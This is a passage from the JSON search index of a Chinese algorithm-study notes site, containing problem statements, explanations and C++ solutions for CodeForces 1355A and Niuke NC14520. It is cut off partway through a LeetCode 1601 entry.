Sample Input 1.6. Sample Output 1.7. Note 1.8. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%9A%B4%E5%8A%9B%E5%89%AA%E6%9E%9D/2.CodeForces_1355_A_Sequence_with_Digits/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%9A%B4%E5%8A%9B%E5%89%AA%E6%9E%9D/2.CodeForces_1355_A_Sequence_with_Digits/#11-limit","text":"Time Limit: 2 seconds Memory Limit: 256 megabytes","title":"1.1. Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%9A%B4%E5%8A%9B%E5%89%AA%E6%9E%9D/2.CodeForces_1355_A_Sequence_with_Digits/#12-problem-description","text":"Let's define the following recurrence: a_{n+1} = a_{n} + minDigit(a_{n}) \\cdot maxDigit(a_{n}) Here minDigit(x) and maxDigit(x) are the minimal and maximal digits in the decimal representation of x without leading zeroes. For examples refer to notes. Your task is calculate a_{K} for given a_{1} and K .","title":"1.2. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%9A%B4%E5%8A%9B%E5%89%AA%E6%9E%9D/2.CodeForces_1355_A_Sequence_with_Digits/#13-input","text":"The first line contains one integer t ( 1 \\le t \\le 1000 ) \u2014 the number of independent test cases. Each test case consists of a single line containing two integers a_{1} and K ( 1 \\le a_{1} \\le 10^{18} , 1 \\le K \\le 10^{16} ) separated by a space.","title":"1.3. Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%9A%B4%E5%8A%9B%E5%89%AA%E6%9E%9D/2.CodeForces_1355_A_Sequence_with_Digits/#14-output","text":"For each test case print one integer a_{K} on a separate line.","title":"1.4. Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%9A%B4%E5%8A%9B%E5%89%AA%E6%9E%9D/2.CodeForces_1355_A_Sequence_with_Digits/#15-sample-input","text":"8 1 4 487 1 487 2 487 3 487 4 487 5 487 6 487 7","title":"1.5. Sample Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%9A%B4%E5%8A%9B%E5%89%AA%E6%9E%9D/2.CodeForces_1355_A_Sequence_with_Digits/#16-sample-output","text":"42 487 519 528 544 564 588 628","title":"1.6. Sample Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%9A%B4%E5%8A%9B%E5%89%AA%E6%9E%9D/2.CodeForces_1355_A_Sequence_with_Digits/#17-note","text":"a_{1} = 487 a_{2} = a_{1} + minDigit(a_{1}) \\cdot maxDigit(a_{1}) = 487 + \\min (4, 8, 7) \\cdot \\max (4, 8, 7) = 487 + 4 \\cdot 8 = 519 a_{3} = a_{2} + minDigit(a_{2}) \\cdot maxDigit(a_{2}) = 519 + \\min (5, 1, 9) \\cdot \\max (5, 1, 9) = 519 + 1 \\cdot 9 = 528 a_{4} = a_{3} + minDigit(a_{3}) \\cdot maxDigit(a_{3}) = 528 + \\min (5, 2, 8) \\cdot \\max (5, 2, 8) = 528 + 2 \\cdot 8 = 544 a_{5} = a_{4} + minDigit(a_{4}) \\cdot maxDigit(a_{4}) = 544 + \\min (5, 4, 4) \\cdot \\max (5, 4, 4) = 544 + 4 \\cdot 5 = 564 a_{6} = a_{5} + minDigit(a_{5}) \\cdot maxDigit(a_{5}) = 564 + \\min (5, 6, 4) \\cdot \\max (5, 6, 4) = 564 + 4 \\cdot 6 = 588 a_{7} = a_{6} + minDigit(a_{6}) \\cdot maxDigit(a_{6}) = 588 + \\min (5, 8, 8) \\cdot \\max (5, 8, 8) = 588 + 5 \\cdot 8 = 628","title":"1.7. Note"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%9A%B4%E5%8A%9B%E5%89%AA%E6%9E%9D/2.CodeForces_1355_A_Sequence_with_Digits/#18-source","text":"CodeForces 1355 A. Sequence with Digits","title":"1.8. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%9A%B4%E5%8A%9B%E5%89%AA%E6%9E%9D/2.CodeForces_1355_A_Sequence_with_Digits/#2","text":"\u76f4\u63a5\u6839\u636e\u516c\u5f0f\u8fdb\u884c\u8ba1\u7b97 a_{n+1} = a_{n} + minDigit(a_{n}) \\cdot maxDigit(a_{n}) \u4f46\u662f\u8003\u8651\u5230\u6570\u636e\u8303\u56f4 ( 1 \\le a_{1} \\le 10^{18} , 1 \\le K \\le 10^{16} )\uff0c\u4e0d\u8fdb\u884c\u526a\u679d\u80af\u5b9a\u4f1a\u8d85\u65f6\u3002 \u6211\u4eec\u53ef\u4ee5\u6ce8\u610f\u5230\u4e00\u4e2a\u89c4\u5f8b\uff0c\u5c31\u662f\u5f53 minDigit(a_{n}) = 0 \u65f6\uff0c minDigit(a_{n}) \\cdot maxDigit(a_{n}) = 0 \uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u5f53\u6211\u4eec\u5728\u6570\u5b57\u4e2d\u627e\u5230\u4e86\u4e00\u4e2a 0 \uff0c\u90a3\u4e48\u5c31\u4e0d\u518d\u9700\u8981\u8fdb\u884c\u8ba1\u7b97\uff0c\u76f4\u63a5\u8fd4\u56de 0 \u5373\u53ef\u3002","title":"2. \u89e3\u8bfb"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%9A%B4%E5%8A%9B%E5%89%AA%E6%9E%9D/2.CodeForces_1355_A_Sequence_with_Digits/#3","text":"#include <algorithm> #include <iostream> using namespace std; long long n, k; // \u8ba1\u7b97\u7ed3\u679c long long calculate(long long x) { long long minN = 10, maxX = 0; while (x) { // \u82e5\u627e\u52300\uff0c\u5219\u8fd4\u56de if (x % 10 == 0) { return 0; } else { minN = min(x % 10, minN); maxX = max(x % 10, maxX); } x /= 10; } return minN * maxX; } int main() { int t; scanf(\"%d\", &t); while (t--) { scanf(\"%lld %lld\", &n, &k); while (--k) { if (calculate(n) == 0) { break; } else { n += calculate(n); } } printf(\"%lld\\n\", n); } } \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%9A%B4%E5%8A%9B%E5%89%AA%E6%9E%9D/3.%E7%89%9B%E5%AE%A2%E7%BD%91_NC14520_%E6%9C%89%E8%B6%A3%E7%9A%84%E6%95%B0%E5%AD%A6/","text":"\u725b\u5ba2\u7f51 NC14520 \u6709\u8da3\u7684\u6570\u5b66 # \u76ee\u5f55 # \u725b\u5ba2\u7f51 NC14520 \u6709\u8da3\u7684\u6570\u5b66 \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.8. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Limit # Time Limit: C/C++ 1\u79d2\uff0c\u5176\u4ed6\u8bed\u8a002\u79d2 Memory Limit: C/C++ 32768K\uff0c\u5176\u4ed6\u8bed\u8a0065536K 1.2. Problem Description # \u5728\u521a\u521a\u8fc7\u53bb\u7684\u53cc11\uff0c\u5bf9\u4e8e\u522b\u4eba\u6765\u8bf4\u662f\u4e00\u4e2a\u8d2d\u7269\u7684\u8282\u65e5\uff0c\u7136\u800c\u5bf9\u4e8eCJJ\u6765\u8bf4\uff0c\u786e\u662f\u4e00\u4e2a\u5355\u8eab\u72d7\u7684\u5149\u68cd\u8282\uff0c\u6240\u4ee5\u4ed6\u53ea\u80fd\u4e00\u4e2a\u4eba\u9ed8\u9ed8\u7684\u5237\u9898\u3002 \u73b0\u5728\uff0cCJJ\u5b66\u957f\u9047\u5230\u4e86\u4e00\u4e2a\u6570\u5b66\u95ee\u9898,\u5982\u679c\u4e00\u4e2a\u6570\u7684\u4e09\u6b21\u65b9\u7684\u540e\u4e24\u4f4d\u662f11,\u90a3\u4e48\u4ed6\u5c06\u5176\u79f0\u4e4b\u4e3a\u201c\u5355\u8eab\u6570\u201d,\u4ed6\u77e5\u9053\u4e86\u7b2c\u4e00\u4e2a\u201c\u5355\u8eab\u6570\u201d\u662f71,CJJ\u5b66\u957f\u60f3\u77e5\u9053\u7b2c n \u4e2a\u201c\u5355\u8eab\u6570\u201d\u662f\u591a\u5c11\u3002 1.3. Input # \u8f93\u5165\u4e00\u4e2a\u6b63\u6574\u6570 T(T\\le100) ,\u8868\u793a\u6709 T \u7ec4\u6570\u636e\uff0c\u6bcf\u7ec4\u6570\u636e\u5305\u62ec\u4e00\u4e2a\u6574\u6570 n(1 \\le n \\le 1000000) 1.4. Output # \u8f93\u51fa\u7b2c n \u4e2a\u201c\u5355\u8eab\u6570\u201d\u3002 1.5. Sample Input # 1 1 1.6. Sample Output # 71 1.8. Source # \u725b\u5ba2\u7f51 NC14520 \u6709\u8da3\u7684\u6570\u5b66 2. \u89e3\u8bfb # \u5148\u679a\u4e3e\u7b2c 1e6 \u4e2a\u5355\u8eab\u6570\uff0c\u53d1\u73b0\u5176\u4e3a 99999971 \uff0c\u4e5f\u5c31\u662f\u4e00\u5171\u9700\u8981\u5927\u6982 1e8 \u6b21\u7684\u8fd0\u7b97\uff0c\u53ef\u4ee5\u8fdb\u884c\u66b4\u529b\u6c42\u89e3\u3002 \u4f46\u662f\u76f4\u63a5\u66b4\u529b\u4f1a\u53d1\u73b0\u901a\u8fc7\u4e0d\u4e86\uff0c\u56e0\u4e3a long long \u7684\u6700\u5927\u503c\u4e3a 9223372036854775807 \uff0c \u4e5f\u5c31\u662f 9.223372 \\times 10 ^ {18} \uff0c\u7136\u800c 99999971 ^3 = 999999130000252299975611 \uff0c\u4e5f\u5c31\u662f 9.999991 \\times 10 ^ {23} \uff0c\u8d85\u51fa\u4e86 long long \u7684\u53d6\u503c\u8303\u56f4\u3002 \u6240\u4ee5\u6211\u4eec\u5728\u8ba1\u7b97\u4e09\u6b21\u65b9\u65f6\u8981\u5bf9\u7ed3\u679c\u53d6\u6a21\uff0c\u9632\u6b62\u6ea2\u51fa\u3002\u56e0\u4e3a\u6211\u4eec\u8003\u8651\u7684\u662f\u540e\u4e24\u4f4d\uff0c\u5bf9 100 \u53d6\u6a21\u5373\u53ef\u3002 3. \u4ee3\u7801 # #include <iostream> using namespace std; const int MAXN = 1e6 + 1; long long list[MAXN]; int main() { long long count = 0, buffer = 0; // \u5148\u8ba1\u7b97\u524d1e6\u4e2a\u5355\u8eab\u6570\u5e76\u5b58\u50a8 for (long long i = 0;; i++) { buffer = ((i * i) % 100 * i) % 100; if (buffer % 10 == 1 && buffer / 10 % 10 == 1) { list[count++] = i; if (count >= MAXN - 1) break; } } int t, n; cin >> t; while (t--) { cin >> n; cout << list[n - 1] << endl; } } \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3.\u725b\u5ba2\u7f51 NC14520 \u6709\u8da3\u7684\u6570\u5b66"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%9A%B4%E5%8A%9B%E5%89%AA%E6%9E%9D/3.%E7%89%9B%E5%AE%A2%E7%BD%91_NC14520_%E6%9C%89%E8%B6%A3%E7%9A%84%E6%95%B0%E5%AD%A6/#nc14520","text":"","title":"\u725b\u5ba2\u7f51 NC14520 \u6709\u8da3\u7684\u6570\u5b66"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%9A%B4%E5%8A%9B%E5%89%AA%E6%9E%9D/3.%E7%89%9B%E5%AE%A2%E7%BD%91_NC14520_%E6%9C%89%E8%B6%A3%E7%9A%84%E6%95%B0%E5%AD%A6/#_1","text":"\u725b\u5ba2\u7f51 NC14520 \u6709\u8da3\u7684\u6570\u5b66 \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.8. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%9A%B4%E5%8A%9B%E5%89%AA%E6%9E%9D/3.%E7%89%9B%E5%AE%A2%E7%BD%91_NC14520_%E6%9C%89%E8%B6%A3%E7%9A%84%E6%95%B0%E5%AD%A6/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%9A%B4%E5%8A%9B%E5%89%AA%E6%9E%9D/3.%E7%89%9B%E5%AE%A2%E7%BD%91_NC14520_%E6%9C%89%E8%B6%A3%E7%9A%84%E6%95%B0%E5%AD%A6/#11-limit","text":"Time Limit: C/C++ 1\u79d2\uff0c\u5176\u4ed6\u8bed\u8a002\u79d2 Memory Limit: C/C++ 32768K\uff0c\u5176\u4ed6\u8bed\u8a0065536K","title":"1.1. Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%9A%B4%E5%8A%9B%E5%89%AA%E6%9E%9D/3.%E7%89%9B%E5%AE%A2%E7%BD%91_NC14520_%E6%9C%89%E8%B6%A3%E7%9A%84%E6%95%B0%E5%AD%A6/#12-problem-description","text":"\u5728\u521a\u521a\u8fc7\u53bb\u7684\u53cc11\uff0c\u5bf9\u4e8e\u522b\u4eba\u6765\u8bf4\u662f\u4e00\u4e2a\u8d2d\u7269\u7684\u8282\u65e5\uff0c\u7136\u800c\u5bf9\u4e8eCJJ\u6765\u8bf4\uff0c\u786e\u662f\u4e00\u4e2a\u5355\u8eab\u72d7\u7684\u5149\u68cd\u8282\uff0c\u6240\u4ee5\u4ed6\u53ea\u80fd\u4e00\u4e2a\u4eba\u9ed8\u9ed8\u7684\u5237\u9898\u3002 \u73b0\u5728\uff0cCJJ\u5b66\u957f\u9047\u5230\u4e86\u4e00\u4e2a\u6570\u5b66\u95ee\u9898,\u5982\u679c\u4e00\u4e2a\u6570\u7684\u4e09\u6b21\u65b9\u7684\u540e\u4e24\u4f4d\u662f11,\u90a3\u4e48\u4ed6\u5c06\u5176\u79f0\u4e4b\u4e3a\u201c\u5355\u8eab\u6570\u201d,\u4ed6\u77e5\u9053\u4e86\u7b2c\u4e00\u4e2a\u201c\u5355\u8eab\u6570\u201d\u662f71,CJJ\u5b66\u957f\u60f3\u77e5\u9053\u7b2c n \u4e2a\u201c\u5355\u8eab\u6570\u201d\u662f\u591a\u5c11\u3002","title":"1.2. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%9A%B4%E5%8A%9B%E5%89%AA%E6%9E%9D/3.%E7%89%9B%E5%AE%A2%E7%BD%91_NC14520_%E6%9C%89%E8%B6%A3%E7%9A%84%E6%95%B0%E5%AD%A6/#13-input","text":"\u8f93\u5165\u4e00\u4e2a\u6b63\u6574\u6570 T(T\\le100) ,\u8868\u793a\u6709 T \u7ec4\u6570\u636e\uff0c\u6bcf\u7ec4\u6570\u636e\u5305\u62ec\u4e00\u4e2a\u6574\u6570 n(1 \\le n \\le 1000000)","title":"1.3. Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%9A%B4%E5%8A%9B%E5%89%AA%E6%9E%9D/3.%E7%89%9B%E5%AE%A2%E7%BD%91_NC14520_%E6%9C%89%E8%B6%A3%E7%9A%84%E6%95%B0%E5%AD%A6/#14-output","text":"\u8f93\u51fa\u7b2c n \u4e2a\u201c\u5355\u8eab\u6570\u201d\u3002","title":"1.4. Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%9A%B4%E5%8A%9B%E5%89%AA%E6%9E%9D/3.%E7%89%9B%E5%AE%A2%E7%BD%91_NC14520_%E6%9C%89%E8%B6%A3%E7%9A%84%E6%95%B0%E5%AD%A6/#15-sample-input","text":"1 1","title":"1.5. Sample Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%9A%B4%E5%8A%9B%E5%89%AA%E6%9E%9D/3.%E7%89%9B%E5%AE%A2%E7%BD%91_NC14520_%E6%9C%89%E8%B6%A3%E7%9A%84%E6%95%B0%E5%AD%A6/#16-sample-output","text":"71","title":"1.6. Sample Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%9A%B4%E5%8A%9B%E5%89%AA%E6%9E%9D/3.%E7%89%9B%E5%AE%A2%E7%BD%91_NC14520_%E6%9C%89%E8%B6%A3%E7%9A%84%E6%95%B0%E5%AD%A6/#18-source","text":"\u725b\u5ba2\u7f51 NC14520 \u6709\u8da3\u7684\u6570\u5b66","title":"1.8. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%9A%B4%E5%8A%9B%E5%89%AA%E6%9E%9D/3.%E7%89%9B%E5%AE%A2%E7%BD%91_NC14520_%E6%9C%89%E8%B6%A3%E7%9A%84%E6%95%B0%E5%AD%A6/#2","text":"\u5148\u679a\u4e3e\u7b2c 1e6 \u4e2a\u5355\u8eab\u6570\uff0c\u53d1\u73b0\u5176\u4e3a 99999971 \uff0c\u4e5f\u5c31\u662f\u4e00\u5171\u9700\u8981\u5927\u6982 1e8 \u6b21\u7684\u8fd0\u7b97\uff0c\u53ef\u4ee5\u8fdb\u884c\u66b4\u529b\u6c42\u89e3\u3002 \u4f46\u662f\u76f4\u63a5\u66b4\u529b\u4f1a\u53d1\u73b0\u901a\u8fc7\u4e0d\u4e86\uff0c\u56e0\u4e3a long long \u7684\u6700\u5927\u503c\u4e3a 9223372036854775807 \uff0c \u4e5f\u5c31\u662f 9.223372 \\times 10 ^ {18} \uff0c\u7136\u800c 99999971 ^3 = 999999130000252299975611 \uff0c\u4e5f\u5c31\u662f 9.999991 \\times 10 ^ {23} \uff0c\u8d85\u51fa\u4e86 long long \u7684\u53d6\u503c\u8303\u56f4\u3002 \u6240\u4ee5\u6211\u4eec\u5728\u8ba1\u7b97\u4e09\u6b21\u65b9\u65f6\u8981\u5bf9\u7ed3\u679c\u53d6\u6a21\uff0c\u9632\u6b62\u6ea2\u51fa\u3002\u56e0\u4e3a\u6211\u4eec\u8003\u8651\u7684\u662f\u540e\u4e24\u4f4d\uff0c\u5bf9 100 \u53d6\u6a21\u5373\u53ef\u3002","title":"2. \u89e3\u8bfb"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%9A%B4%E5%8A%9B%E5%89%AA%E6%9E%9D/3.%E7%89%9B%E5%AE%A2%E7%BD%91_NC14520_%E6%9C%89%E8%B6%A3%E7%9A%84%E6%95%B0%E5%AD%A6/#3","text":"#include <iostream> using namespace std; const int MAXN = 1e6 + 1; long long list[MAXN]; int main() { long long count = 0, buffer = 0; // \u5148\u8ba1\u7b97\u524d1e6\u4e2a\u5355\u8eab\u6570\u5e76\u5b58\u50a8 for (long long i = 0;; i++) { buffer = ((i * i) % 100 * i) % 100; if (buffer % 10 == 1 && buffer / 10 % 10 == 1) { list[count++] = i; if (count >= MAXN - 1) break; } } int t, n; cin >> t; while (t--) { cin >> n; cout << list[n - 1] << endl; } } \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E6%9A%B4%E5%8A%9B%E5%89%AA%E6%9E%9D/4.LeetCode_1601_%E6%9C%80%E5%A4%9A%E5%8F%AF%E8%BE%BE%E6%88%90%E7%9A%84%E6%8D%A2%E6%A5%BC%E8%AF%B7%E6%B1%82%E6%95%B0%E7%9B%AE/","text":"LeetCode 1601 \u6700\u591a\u53ef\u8fbe\u6210\u7684\u6362\u697c\u8bf7\u6c42\u6570\u76ee # \u76ee\u5f55 # LeetCode 1601 \u6700\u591a\u53ef\u8fbe\u6210\u7684\u6362\u697c\u8bf7\u6c42\u6570\u76ee \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Sample Input 1 1.4. Sample Output 1 1.5. Sample Input 2 1.6. Sample Output 2 1.7. Notes 1.8. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Limit # Time Limit: 2000 ms Memory Limit: 131072 kB 1.2. Problem Description # \u6211\u4eec\u6709 n \u680b\u697c\uff0c\u7f16\u53f7\u4ece 0 \u5230 n - 1 \u3002\u6bcf\u680b\u697c\u6709\u82e5\u5e72\u5458\u5de5\u3002\u7531\u4e8e\u73b0\u5728\u662f\u6362\u697c\u7684\u5b63\u8282\uff0c\u90e8\u5206\u5458\u5de5\u60f3\u8981\u6362\u4e00\u680b\u697c\u5c45\u4f4f\u3002 \u7ed9\u4f60\u4e00\u4e2a\u6570\u7ec4 requests \uff0c\u5176\u4e2d requests[i] = [from_i, to_i] \uff0c\u8868\u793a\u4e00\u4e2a\u5458\u5de5\u8bf7\u6c42\u4ece\u7f16\u53f7\u4e3a from_i \u7684\u697c\u642c\u5230\u7f16\u53f7\u4e3a to_i \u7684\u697c\u3002 \u4e00\u5f00\u59cb \u6240\u6709\u697c\u90fd\u662f\u6ee1\u7684\uff0c\u6240\u4ee5\u4ece\u8bf7\u6c42\u5217\u8868\u4e2d\u9009\u51fa\u7684\u82e5\u5e72\u4e2a\u8bf7\u6c42\u662f\u53ef\u884c\u7684\u9700\u8981\u6ee1\u8db3 \u6bcf\u680b\u697c\u5458\u5de5\u51c0\u53d8\u5316\u4e3a 0 \u3002\u610f\u601d\u662f\u6bcf\u680b\u697c \u79bb\u5f00 \u7684\u5458\u5de5\u6570\u76ee \u7b49\u4e8e \u8be5\u697c \u642c\u5165 \u7684\u5458\u5de5\u6570\u6570\u76ee\u3002\u6bd4\u65b9\u8bf4 n = 3 \u4e14\u4e24\u4e2a\u5458\u5de5\u8981\u79bb\u5f00\u697c 0 \uff0c\u4e00\u4e2a\u5458\u5de5\u8981\u79bb\u5f00\u697c 1 \uff0c\u4e00\u4e2a\u5458\u5de5\u8981\u79bb\u5f00\u697c 2 \uff0c\u5982\u679c\u8be5\u8bf7\u6c42\u5217\u8868\u53ef\u884c\uff0c\u5e94\u8be5\u8981\u6709\u4e24\u4e2a\u5458\u5de5\u642c\u5165\u697c 0 \uff0c\u4e00\u4e2a\u5458\u5de5\u642c\u5165\u697c 1 \uff0c\u4e00\u4e2a\u5458\u5de5\u642c\u5165\u697c 2 \u3002 \u8bf7\u4f60\u4ece\u539f\u8bf7\u6c42\u5217\u8868\u4e2d\u9009\u51fa\u82e5\u5e72\u4e2a\u8bf7\u6c42\uff0c\u4f7f\u5f97\u5b83\u4eec\u662f\u4e00\u4e2a\u53ef\u884c\u7684\u8bf7\u6c42\u5217\u8868\uff0c\u5e76\u8fd4\u56de\u6240\u6709\u53ef\u884c\u5217\u8868\u4e2d\u6700\u5927\u8bf7\u6c42\u6570\u76ee\u3002 1.3. Sample Input 1 # \u8f93\u5165\uff1an = 5, requests = [[0,1],[1,0],[0,1],[1,2],[2,0],[3,4]] 1.4. Sample Output 1 # \u8f93\u51fa\uff1a5 \u89e3\u91ca\uff1a\u8bf7\u6c42\u5217\u8868\u5982\u4e0b\uff1a \u4ece\u697c 0 \u79bb\u5f00\u7684\u5458\u5de5\u4e3a x \u548c y \uff0c\u4e14\u4ed6\u4eec\u90fd\u60f3\u8981\u642c\u5230\u697c 1 \u3002 \u4ece\u697c 1 \u79bb\u5f00\u7684\u5458\u5de5\u4e3a a \u548c b \uff0c\u4e14\u4ed6\u4eec\u5206\u522b\u60f3\u8981\u642c\u5230\u697c 2 \u548c 0 \u3002 \u4ece\u697c 2 \u79bb\u5f00\u7684\u5458\u5de5\u4e3a z \uff0c\u4e14\u4ed6\u60f3\u8981\u642c\u5230\u697c 0 \u3002 \u4ece\u697c 3 \u79bb\u5f00\u7684\u5458\u5de5\u4e3a c \uff0c\u4e14\u4ed6\u60f3\u8981\u642c\u5230\u697c 4 \u3002 \u6ca1\u6709\u5458\u5de5\u4ece\u697c 4 \u79bb\u5f00\u3002 \u6211\u4eec\u53ef\u4ee5\u8ba9 x \u548c b \u4ea4\u6362\u4ed6\u4eec\u7684\u697c\uff0c\u4ee5\u6ee1\u8db3\u4ed6\u4eec\u7684\u8bf7\u6c42\u3002 \u6211\u4eec\u53ef\u4ee5\u8ba9 y\uff0ca \u548c z \u4e09\u4eba\u5728\u4e09\u680b\u697c\u95f4\u4ea4\u6362\u4f4d\u7f6e\uff0c\u6ee1\u8db3\u4ed6\u4eec\u7684\u8981\u6c42\u3002 \u6240\u4ee5\u6700\u591a\u53ef\u4ee5\u6ee1\u8db3 5 \u4e2a\u8bf7\u6c42\u3002 1.5. Sample Input 2 # \u8f93\u5165\uff1an = 3, requests = [[0,0],[1,2],[2,1]] 1.6. Sample Output 2 # \u8f93\u51fa\uff1a3 \u89e3\u91ca\uff1a\u8bf7\u6c42\u5217\u8868\u5982\u4e0b\uff1a \u4ece\u697c 0 \u79bb\u5f00\u7684\u5458\u5de5\u4e3a x \uff0c\u4e14\u4ed6\u60f3\u8981\u56de\u5230\u539f\u6765\u7684\u697c 0 \u3002 \u4ece\u697c 1 \u79bb\u5f00\u7684\u5458\u5de5\u4e3a y \uff0c\u4e14\u4ed6\u60f3\u8981\u642c\u5230\u697c 2 \u3002 \u4ece\u697c 2 \u79bb\u5f00\u7684\u5458\u5de5\u4e3a z \uff0c\u4e14\u4ed6\u60f3\u8981\u642c\u5230\u697c 1 